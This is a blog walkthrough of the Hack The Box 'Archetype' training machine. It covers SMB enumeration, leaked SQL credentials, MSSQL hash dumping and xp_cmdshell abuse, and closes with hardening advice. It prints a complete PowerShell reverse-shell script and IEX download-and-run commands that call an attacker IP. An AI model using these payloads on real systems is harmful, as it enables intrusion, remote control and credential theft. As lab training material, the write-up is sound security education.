## HTB Starting Point: Archetype

`Archetype` is a 1st box from Starting Point path on [HackTheBox.eu](https://app.hackthebox.eu). This path is composed of 9 boxes in a way that later boxes use information (like credentials) gathered from the previous ones.

This is a Windows box where you can learn how enumeration can lead to RCE via SQL server queries.

***
# Contents
1. [Basic Information](#basic-information)
2. [Target of Evaluation](#target-of-evaluation)
3. [Recon](#recon)
4. [SMB (:445)](#smb-445)
5. [MS SQL (:1433)](#ms-sql-1433)
6. [Exploitation (user shell)](#exploitation-user-shell)
7. [Escalating Privileges](#escalating-privileges)
8. [Hardening Ideas](#hardening-ideas)
9. [Additional Readings](#additional-readings)
***

# Basic Information

| #     |   |
|:--    |:--|
| Type    |Starting Point
|Name    | **	Hack The Box / Archetype**
|Pwned| 2021/04/19
|URLs    | https://app.hackthebox.eu/machines/287
|Author  | **Asentinn** / OkabeRintaro
|       | [https://ctftime.org/team/152207](https://ctftime.org/team/152207)

%%[patreon-btn]

# Target of Evaluation

We've got the IP of the machine - I'm setting the session variable: `IP=10.10.10.27`

# Recon

Running `nmap` scan `nmap -sV -sC -p- $IP`

Meanwhile, curling the `:80` return nothing, which means website is not running, or it is configured on the other port.

```sh
$ curl $IP
curl: (7) Failed to connect to 10.10.10.27 port 80: Connection refused
```

Scan ended:

```txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 18:21 CEST
Nmap scan report for 10.10.10.27
Host is up (0.046s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-06-16T08:24:17
|_Not valid after:  2051-06-16T08:24:17
|_ssl-date: 2021-06-16T16:41:43+00:00; +18m23s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h42m23s, deviation: 3h07m50s, median: 18m22s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-16T09:41:35-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-16T16:41:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.48 seconds

```

[Back to top](#contents) ⤴

# SMB (:445)

```sh
$ smbclient -N -L \\\\$IP
```

![5837526228887.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932891091/K4g8csHPw.png)

Ok, let's try to get into `backups` and download what we find there.

![5451420786410.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932903954/QIMCCZeNX.png)

## `prod.dtsConfig`

```xml                  
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

Cool, we have the credentials to the database. Because all Starting Point boxes are connected, I'm storing the credentials to the separate file I can refer to later.

``` sh
echo 'sql_svc|M3g4c0rp123' | tee -a ../.credentials
```

> `tee -a` will append to file or create if it doesn't exists

[Back to top](#contents) ⤴

# MS SQL (:1433)

Because we have the credentials to the database, I'm firing up the `pymssql` to get some basic information.

```py
#query.py

import pymssql

queries = [
  "SELECT @@version",
  "SELECT user_name()",
  "SELECT system_user",
  "SELECT name FROM master..syslogins", #dump logins
]

with pymssql.connect('10.10.10.27', 'ARCHETYPE\\ ', 'M3g4c0rp123', 'master') as conn:
  with conn.cursor() as cursor:
    for query in queries:
      print(f'\n#-- {query}\n')
      cursor.execute(query)
      print(cursor.fetchall())
```

![5180850575502.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932919370/TbjkOyrU-.png)

* [system_user](https://docs.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql?view=sql-server-ver15#a-using-system_user-to-return-the-current-system-user-name)
* [user_name()](https://www.w3schools.com/sql/func_sqlserver_user_name.asp)
* [Double Dot Notation](https://stackoverflow.com/a/34786151)

Let's see what Server-scoped permission current user have

```sql
SELECT permission_name FROM master..fn_my_permissions(null, 'SERVER')
```

![2376129911253.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932934399/8eWiPgEM8.png)

Well, it seems like we have a pretty wide permission set. For example, we can dump login hashes for the logins because of the `CONTROL SERVER`.

```sql
SELECT name + ':' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

![3770297859657.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932945670/Vq-WkDwR3.png)

Let's run the `hashcat` in the background:

```sh
hashcat -m 1731 -a 0 -O --status --session=archtype 0x0200100bac9600580c3c299ed7ff81d77bcbe50b830ca60306d7a5e5bf34a5c6be0d895247952bfff5708764033a797e8ca4f2004797203d7ee5c794d655c3218a0b13a3ce63 /usr/wl/rockyou.txt
```

> Rule of thumb for HTB boxes is - if you can't crack the password using rockyou wordlist - this is probably not a hash you are looking for.

Now, what I'm interested in (and probably I should check that right away) is if `sql_svc` can execute system commands.

```sql
SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM sys.configurations WHERE name = 'xp_cmdshell'
```

![941140546299.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932959096/MoPcDfWAu.png)

> The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account

* [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)

Perfect!

At that time, `hashcat` finished working:

```txt
Session..........: archtype                      
Status...........: Exhausted
Hash.Name........: MSSQL (2012, 2014)
Hash.Target......: 0x0200100bac9600580c3c299ed7ff81d77bcbe50b830ca6030...a3ce63
Time.Started.....: Wed Jun 16 19:24:08 2021 (9 secs)
Time.Estimated...: Wed Jun 16 19:24:17 2021 (0 secs)
Guess.Base.......: File (/usr/wl/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1523.5 kH/s (1.50ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 6538/14344385 (0.05%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[213134356173382a] -> $HEX[042a0337c2a156616d6f732103]
Started: Wed Jun 16 19:23:58 2021
Stopped: Wed Jun 16 19:24:18 2021

```
And as I was expecting from the time of it took - this is not what we had to do.

[Back to top](#contents) ⤴

# Exploitation (user shell)

> 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring on the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/cyberethicalme) which also gives you some bonus perks.

With that in the hands, we could try to get the reverse shell.

```ps1
# cmd.ps1

$TCPClient = New-Object Net.Sockets.TCPClient('10.10.XX.XXX', 4445);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
```

```sql
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(''http://10.10.XX.XXX/cmd.ps1'') | powershell'
```

![4342537102777.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932975802/VmpXy7dtK.png)

We've got the PS shell.

|         #          |                                         |
| ------------------ | --------------------------------------- |
| Linux Bash         | `find / -name user.txt 2>/dev/null`     |
| Windows PowerShell | `gci c:\ -Force -r -fi user.txt 2>NULL` |

> `gci` is an alias for `Get-ChildItem`

![4745490917121.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932985178/NLP8xiau_.png)

[Back to top](#contents) ⤴

# Escalating Privileges

Ok, let's try to blind shot for other `*.txt` files

```ps1
gci c:\ -r -Force -fi *.txt 2>NULL
```

![1003112787307.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623932997599/kxyDmbfmN.png)

This is a persistent PowerShell history. Lets `cat` it out.

```text
cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![2347245881447.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623933008469/4sbZuCgMl.png)

Sweet, additional credentials to collection.

```sh
echo 'administrator|MEGACORP_4dm1n!!' | tee -a ../.credentials
```

And it looks like a System Account. Let's try to hop into his PS Session.

```
$username = "administrator";$password = "MEGACORP_4dm1n!!" | ConvertTo-SecureString -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password;

Invoke-Command -ComputerName ARCHETYPE -Credential $cred -ScriptBlock {echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.XX.XXX/system.ps1') | powershell}
```

> In `system.ps1` I was reusing the `cmd.ps1` with different listening port

![999794512987.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623933022870/Q0vXW53tR.png)

This is the same flag file, we just are using the `-Force` parameter and hidden folder `Documets and Settings` with symbolic link is showing.

> Like what you see? Join the [Hashnode.com](/join) now. Things that are awesome:

>✔ Automatic GitHub Backup

>✔ Write in Markdown

>✔ Free domain mapping

>✔ CDN hosted images

>✔ Free in-built newsletter service

> By using my link you can help me unlock the ambasador role, which cost you nothing and gives me some additional features to support my content creation mojo.

[Back to top](#contents) ⤴

# Hardening Ideas

### Anonymous access to the credentials

For sure, first thing to do is to never store credentials in a publicly available places like SMB with anonymous access. If you have to share for some reason for public audience, make sure that no credentials are leaked - maybe pass them via different channel.

### Disable `xp_cmdshell`

This method should be disabled or enabled only for a highly secured administrator account, and not the same account services is running on.

```sql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To disable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 0;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO  
```

*Source: [Disable xp_cmdshell](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15)*

# Additional Readings

> 📌 Follow the `#CyberEthical` hashtag on the social media

> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)

> 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek)

> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)

> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)

* [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
* [system_user](https://docs.microsoft.com/en-us/sql/t-sql/functions/system-user-transact-sql?view=sql-server-ver15#a-using-system_user-to-return-the-current-system-user-name)
* [user_name()](https://www.w3schools.com/sql/func_sqlserver_user_name.asp)
* [Double Dot Notation](https://stackoverflow.com/a/34786151)
* [Reverse Shell Generator](https://www.revshells.com/)

[Back to top](#contents) ⤴